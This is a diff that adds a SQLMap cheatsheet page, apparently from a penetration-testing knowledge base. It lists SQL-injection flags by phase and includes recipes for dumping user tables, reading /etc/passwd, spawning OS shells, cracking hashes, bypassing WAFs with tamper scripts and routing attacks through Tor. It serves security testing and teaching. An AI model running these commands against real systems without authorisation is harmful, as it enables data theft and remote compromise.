@@ -1,0 +1,417 @@
+---
+title: Cheatsheet
+description: Every operator-relevant SQLMap flag in one place, organized by phase - target spec, detection, technique, enumeration, file ops, OS exec, bypass, output, session. Designed for instant lookup, not learning.
+mitre: [T1190]
+d3fend: []
+sidebar:
+  order: 8
+  label: Cheatsheet
+---
+
+## TL;DR
+
+A flag-organized reference. Each table is one logical phase; each row is one flag with its purpose. When in doubt about a flag, this page first; the topic pages (linked at the top of each section) for context.
+
+```
+# A complete operator workflow in shorthand
+sqlmap -r req.txt --batch                                                    # spec the target
+sqlmap -r req.txt --batch --level=5 --risk=3 --tamper=between,space2comment  # detect with bypass
+sqlmap -r req.txt --batch --dbs                                              # enumerate
+sqlmap -r req.txt --batch -D prod -T users --dump                            # exfiltrate
+sqlmap -r req.txt --batch --is-dba --file-read=/etc/passwd                   # post-exploit
+sqlmap -r req.txt --batch --os-shell --technique=E                           # RCE
+```
+
+Success indicator: a working session that progresses cleanly through these phases without you opening the SQLMap help twice.
+
+## Target specification
+
+See [Request Setup](/codex/web/sqli/sqlmap/request-setup/).
+
+| Flag | Purpose |
+| --- | --- |
+| `-u URL` | Target URL (with GET params inline) |
+| `--url URL` | Same as `-u` |
+| `-r FILE` | Use Burp-captured HTTP request file |
+| `--data STRING` | POST body (form-data, JSON, XML, whatever) |
+| `--method M` | Override HTTP method (PUT, DELETE, PATCH, etc.) |
+| `-p PARAM` | Restrict testing to a specific parameter |
+| `--skip PARAM` | Skip testing this parameter |
+| `*` (in URL/data) | Injection marker - restrict testing to this exact spot |
+| `--param-del CHAR` | Parameter delimiter (default `&`, sometimes `;`) |
+| `--param-exclude REGEX` | Skip parameters matching this regex |
+| `--randomize PARAM` | Randomize this parameter's value on every request |
+| `--eval CODE` | Python code to compute parameter values pre-request |
+| `--batch` | Auto-accept all interactive prompts with defaults |
+| `--crawl=N` | Crawl the site to depth N, test forms found |
+| `--forms` | Parse and test forms on the target URL |
+| `-g GOOGLE_DORK` | Test all URLs from Google search results |
+| `-m FILE` | Test multiple targets from a list file |
+
+### Headers, cookies, auth
+
+| Flag | Purpose |
+| --- | --- |
+| `-H 'Name: value'` | Add a custom header (repeatable) |
+| `--headers="H1\nH2"` | Multiple headers in one flag |
+| `--cookie="k=v; k2=v2"` | Cookie header |
+| `--cookie-del CHAR` | Cookie value separator (default `;`) |
+| `--load-cookies FILE` | Load Netscape/Mozilla-format cookies file |
+| `--drop-set-cookie` | Ignore `Set-Cookie` in responses |
+| `-A USER_AGENT` | Set User-Agent |
+| `--user-agent UA` | Same as `-A` |
+| `--random-agent` | Random UA per scan (from built-in pool) |
+| `--mobile` | Use a mobile-browser UA |
+| `--host HOST` | Set Host header |
+| `--referer URL` | Set Referer header |
+| `--auth-type TYPE` | HTTP auth type (Basic, Digest, NTLM, PKI) |
+| `--auth-cred user:pass` | HTTP auth credentials |
+| `--auth-file FILE` | PEM cert for client-cert auth |
+
+## Connection
+
+| Flag | Purpose |
+| --- | --- |
+| `--proxy=URL` | Route through proxy (Burp = `http://127.0.0.1:8080`) |
+| `--proxy-cred=user:pass` | Proxy credentials |
+| `--proxy-file=FILE` | List of proxies, rotate through them |
+| `--tor` | Use local Tor SOCKS proxy |
+| `--tor-port=N` | Tor port if non-default |
+| `--tor-type=SOCKS5` | Tor proxy type (default SOCKS5) |
+| `--check-tor` | Verify Tor actually anonymizes |
+| `--force-ssl` | Force HTTPS to target |
+| `--ignore-proxy` | Ignore $HTTP_PROXY env var |
+| `--ignore-redirects` | Don't follow redirects |
+| `--ignore-timeouts` | Treat timeouts as non-errors |
+| `--delay=N` | Seconds between requests |
+| `--timeout=N` | Per-request timeout |
+| `--retries=N` | Retries per failing request (default 3) |
+| `--keep-alive` | HTTP keep-alive |
+| `--null-connection` | Use HEAD requests where possible for speed |
+| `--threads=N` | Parallel requests (max 10) |
+
+## Detection
+
+See [Detection & Tuning](/codex/web/sqli/sqlmap/detection-and-tuning/).
+
+| Flag | Purpose |
+| --- | --- |
+| `--level=1..5` | Test depth (default 1; 5 = all 7,800 payloads) |
+| `--risk=1..3` | Risk tolerance (default 1; 3 = includes OR-based that may modify data) |
+| `--prefix=STR` | Prepend STR to every payload |
+| `--suffix=STR` | Append STR to every payload |
+| `--dbms=NAME` | Skip DBMS fingerprint, force this DBMS |
+| `--dbms-cred=user:pass` | DBMS credentials (for `--passwords` against specific user) |
+| `--os=NAME` | Force OS (Linux, Windows) |
+| `--invalid-bignum` | Use big numbers to invalidate (instead of negation) |
+| `--invalid-logical` | Use logical ops to invalidate |
+| `--invalid-string` | Use random strings to invalidate |
+| `--no-cast` | Skip CAST() wrapper on extraction |
+| `--no-escape` | Skip string escape in payloads |
+| `--skip-static` | Test even parameters classified as static |
+| `--skip-heuristics` | Skip heuristic detection |
+| `--skip-urlencode` | Don't URL-encode payloads |
+| `--skip-waf` | Skip WAF/IPS detection heuristic |
+| `--time-sec=N` | SLEEP seconds for time-based blind (default 5) |
+| `--union-cols=N` | Force UNION column count |
+| `--union-char=CHAR` | UNION fill character (default NULL + random ints) |
+| `--union-from=TABLE` | Append `FROM TABLE` to UNION (Oracle, etc.) |
+| `--second-url=URL` | Second-order URL to fetch after each payload |
+| `--second-req=FILE` | Second-order request file |
+
+### Response differential
+
+| Flag | Purpose |
+| --- | --- |
+| `--string=TEXT` | TRUE responses contain TEXT |
+| `--not-string=TEXT` | FALSE responses contain TEXT |
+| `--regexp=PATTERN` | TRUE responses match regex |
+| `--code=N` | TRUE responses return HTTP code N |
+| `--titles` | Compare `<title>` rather than full body |
+| `--text-only` | Strip HTML before comparison |
+| `--parse-errors` | Print parsed DBMS errors |
+| `--repair` | Re-run failed extractions on detection |
+
+## Technique selection
+
+See the BEUSTQ technique matrix in [SQLMap overview](/codex/web/sqli/sqlmap/).
+
+| Flag | Effect |
+| --- | --- |
+| `--technique=B` | Only boolean-based blind |
+| `--technique=E` | Only error-based |
+| `--technique=U` | Only UNION-based |
+| `--technique=S` | Only stacked queries |
+| `--technique=T` | Only time-based blind |
+| `--technique=Q` | Only inline queries |
+| `--technique=BEU` | Any subset (combine letters; default is `BEUSTQ`) |
+| `--dns-domain=DOMAIN` | Enable out-of-band DNS exfil (you control DOMAIN's DNS) |
+
+## Enumeration
+
+See [Enumeration](/codex/web/sqli/sqlmap/enumeration/).
+
+### Recon
+
+| Flag | What it returns |
+| --- | --- |
+| `--banner` | DBMS version banner |
+| `--current-user` | DB connection user |
+| `--current-db` | Current database name |
+| `--hostname` | DB server hostname |
+| `--is-dba` | Whether current user has DBA rights |
+| `--users` | List all DB users |
+| `--passwords` | DB user password hashes (DBA usually required) |
+| `--privileges` | Per-user privileges |
+| `--roles` | Per-user roles (Oracle/MSSQL) |
+| `--statements` | List currently-executing SQL (live) |
+
+### Schema enumeration
+
+| Flag | What it returns |
+| --- | --- |
+| `--dbs` | All databases (schemas) |
+| `--tables` | Tables in current DB (or in DB specified with `-D`) |
+| `--columns` | Columns in current table (or `-T`) |
+| `--schema` | Full schema overview (all DBs, tables, columns) |
+| `--count` | Row counts per table |
+| `--comments` | Include SQL comments in output |
+| `--search` | Search across schema by keyword |
+| `-D DB` | Restrict to database DB |
+| `-T TABLE` | Restrict to table TABLE |
+| `-C COL,COL2` | Restrict to columns |
+| `--exclude-sysdbs` | Skip system DBs (mysql, sys, information_schema, etc.) |
+
+### Data extraction
+
+| Flag | What it does |
+| --- | --- |
+| `--dump` | Dump entries from selected table/columns |
+| `--dump-all` | Dump every accessible table from every accessible DB |
+| `--where="COND"` | WHERE clause filter for `--dump` |
+| `--start=N` | First row to extract |
+| `--stop=N` | Last row to extract |
+| `--first=N` | First character of value to extract (blind) |
+| `--last=N` | Last character of value to extract (blind) |
+| `--dump-format=FMT` | Output format: CSV (default), HTML, SQLITE |
+| `--sql-query=Q` | Run a literal SQL query |
+| `--sql-shell` | Interactive SQL prompt |
+| `--sql-file=F` | Run SQL from file |
+
+### Hash cracking
+
+| Flag | What it does |
+| --- | --- |
+| (Interactive prompt when hashes are detected) | Offer to crack in-process |
+| (Built-in wordlist) | `/usr/share/sqlmap/data/txt/wordlist.tx_` (~1.4M entries) |
+
+The cracking happens inline during `--dump` or `--passwords` when SQLMap recognizes a hash format. To opt out non-interactively: `--batch` accepts all prompts including "do you want to crack" → yes.
+
+## File operations
+
+See [OS Exploitation](/codex/web/sqli/sqlmap/os-exploitation/).
+
+| Flag | Purpose |
+| --- | --- |
+| `--file-read=PATH` | Read file from DB host |
+| `--file-write=LOCAL` | Local file to write to DB host |
+| `--file-dest=REMOTE_PATH` | Where to write on DB host |
+
+## OS command execution
+
+| Flag | Purpose |
+| --- | --- |
+| `--os-shell` | Interactive OS shell on DB host |
+| `--os-cmd=CMD` | One-shot OS command |
+| `--os-pwn` | Drop a Meterpreter session via msfvenom |
+| `--os-smbrelay` | SMB relay attack (MSSQL with `xp_dirtree` + Responder) |
+| `--os-bof` | Buffer overflow exploit for MSSQL `sp_replwritetovarbin` |
+| `--reg-read` | Read Windows registry key (MSSQL) |
+| `--reg-add` | Write Windows registry key |
+| `--reg-del` | Delete Windows registry key |
+| `--reg-key=PATH` | Registry key path |
+| `--reg-value=NAME` | Registry value name |
+| `--reg-data=DATA` | Registry value data |
+| `--reg-type=TYPE` | Registry value type (REG_SZ, REG_DWORD, etc.) |
+
+### MSF integration
+
+| Flag | Purpose |
+| --- | --- |
+| `--msf-path=PATH` | Path to Metasploit framework |
+| `--tmp-path=PATH` | Remote tempdir for staging |
+
+## WAF / IPS bypass
+
+See [WAF Bypass](/codex/web/sqli/sqlmap/waf-bypass/).
+
+| Flag | Purpose |
+| --- | --- |
+| `--random-agent` | Random real-browser UA |
+| `--mobile` | Mobile UA |
+| `--tamper=SCRIPT[,SCRIPT2,...]` | Apply tamper scripts to payloads (see list below) |
+| `--list-tampers` | Print all available tamper scripts |
+| `--chunked` | Send POST body as HTTP chunked transfer |
+| `--hpp` | HTTP Parameter Pollution mode |
+| `--csrf-token=NAME` | Auto-refresh CSRF token param |
+| `--csrf-url=URL` | Fetch CSRF token from this URL |
+| `--csrf-method=METHOD` | Method for CSRF token URL |
+| `--csrf-data=DATA` | Data for CSRF token URL (if POST) |
+| `--csrf-retries=N` | CSRF retries |
+| `--safe-url=URL` | "Safe" URL to keep session alive |
+| `--safe-post=DATA` | POST body for safe URL |
+| `--safe-req=FILE` | Request file for safe URL |
+| `--safe-freq=N` | Hit safe URL every N requests |
+| `--randomize=PARAM` | Randomize parameter value per request |
+| `--eval=CODE` | Python pre-request code |
+
+### Common tamper scripts
+
+| Tamper | Effect |
+| --- | --- |
+| `between` | `>` → `NOT BETWEEN 0 AND #`; `=` → `BETWEEN # AND #` |
+| `space2comment` | space → `/**/` |
+| `space2dash` | space → `-- \n` + random string |
+| `space2hash` | space → `#\n` + random string (MySQL) |
+| `space2plus` | space → `+` |
+| `space2randomblank` | space → random whitespace char |
+| `randomcase` | random-case keywords (`SELECT` → `SeLeCt`) |
+| `equaltolike` | `=` → `LIKE` |
+| `0eunion` | `UNION` → `e0UNION` |
+| `base64encode` | base64 the whole payload |
+| `charencode` | URL-encode every char |
+| `charunicodeencode` | Unicode-encode every char |
+| `commalesslimit` | `LIMIT M,N` → `LIMIT N OFFSET M` (MySQL) |
+| `apostrophenullencode` | `'` → `%00%27` |
+| `apostrophemask` | `'` → unicode look-alike |
+| `appendnullbyte` | append `%00` |
+| `halfversionedmorekeywords` | versioned-comment prefix on keywords (MySQL) |
+| `modsecurityversioned` | wrap query in MySQL versioned comment |
+| `modsecurityzeroversioned` | wrap in zero-versioned comment |
+| `percentage` | `%` before each char (ASP) |
+| `plus2concat` | `+` → `CONCAT()` (MSSQL) |
+| `plus2fnconcat` | `+` → `{fn CONCAT()}` (MSSQL ODBC) |
+| `symboliclogical` | `AND/OR` → `&&/\|\|` |
+| `versionedkeywords` | wrap non-function keywords in MySQL versioned comment |
+| `versionedmorekeywords` | wrap every keyword in MySQL versioned comment |
+
+Chaining respects predefined priority. Common combinations:
+
+| Stack | Use case |
+| --- | --- |
+| `between` | First try when `=`/`>` blocked |
+| `space2comment` | First try when spaces blocked |
+| `between,space2comment` | Generic baseline bypass |
+| `between,randomcase,space2comment` | Slightly stronger |
+| `modsecurityversioned` | Specifically targets ModSecurity rules |
+| `apostrophenullencode,space2comment` | Bypasses quote + space filters |
+| `charunicodeencode` | Catches naive char-class filters |
+
+## Output and session
+
+| Flag | Purpose |
+| --- | --- |
+| `-v 0..6` | Verbosity (3 = payloads; 6 = full trace) |
+| `--output-dir=PATH` | Custom location for session files |
+| `--flush-session` | Discard cached state for this target |
+| `--purge` | Delete entire SQLMap output directory |
+| `--fresh-queries` | Don't reuse cached query results |
+| `-t FILE` | Log all HTTP traffic to FILE |
+| `--har=FILE` | Save HTTP traffic as HAR (browser dev-tools format) |
+| `--save=FILE` | Save options to a config file |
+| `-c FILE` | Load options from config file |
+| `--results-file=FILE` | Write `-m` summary to FILE |
+| `--update` | Update SQLMap itself |
+| `--version` | Print version |
+| `-h` | Short help |
+| `-hh` | Full help |
+| `--api` | Run SQLMap REST API server |
+| `--api-server` | Same |
+| `--api-client` | API client mode |
+
+## Reporting flags
+
+| Flag | What it gives |
+| --- | --- |
+| `--dump-format=HTML` | Browseable HTML output of dumped tables |
+| `--dump-format=SQLITE` | SQLite DB of dumped tables (queryable later) |
+| `--har=FILE` | Full traffic in HAR format (open in browser dev tools) |
+| Session files at `~/.sqlmap/output/<host>/` | Persistent - include in deliverables |
+
+## Performance / parallelism
+
+| Flag | Effect |
+| --- | --- |
+| `--threads=N` | Parallel requests (max 10) |
+| `--predict-output` | Use prior values to skip already-known characters |
+| `--keep-alive` | HTTP keep-alive |
+| `--null-connection` | HEAD requests where possible (faster boolean blind) |
+| `--no-cast` | Skip CAST() wrapper (faster, but breaks some extractions) |
+| `--fresh-queries` | Don't reuse cached query results |
+| `--time-sec=N` | SLEEP delay for time-based (lower = faster but more false positives) |
+
+## Quick recipes
+
+### "Just try it"
+
+```shell
+sqlmap -u 'http://target/vuln.php?id=1' --batch
+```
+
+### "Got a Burp request"
+
+```shell
+sqlmap -r req.txt --batch
+```
+
+### "JSON API"
+
+```shell
+sqlmap -u 'http://target/api/items' \
+       -H 'Content-Type: application/json' \
+       --data '{"id":1*}' --batch
+```
+
+### "Try harder"
+
+```shell
+sqlmap -r req.txt --batch --level=5 --risk=3 \
+       --tamper=between,space2comment --random-agent --dbms=MySQL
+```
+
+### "Extract one specific table"
+
+```shell
+sqlmap -r req.txt --batch -D prod -T users --dump
+```
+
+### "Get a shell, fast"
+
+```shell
+sqlmap -r req.txt --batch --is-dba           # confirm DBA first
+sqlmap -r req.txt --batch --os-shell --technique=E    # then interactive
+```
+
+### "Read a specific file"
+
+```shell
+sqlmap -r req.txt --batch --file-read=/etc/passwd
+```
+
+### "Through Tor"
+
+```shell
+sqlmap -r req.txt --batch --tor --tor-type=SOCKS5 --check-tor
+```
+
+### "Through Burp for replay"
+
+```shell
+sqlmap -r req.txt --batch --proxy=http://127.0.0.1:8080 --ignore-certs
+```
+
+### "Reset everything"
+
+```shell
+sqlmap -r req.txt --flush-session
+```
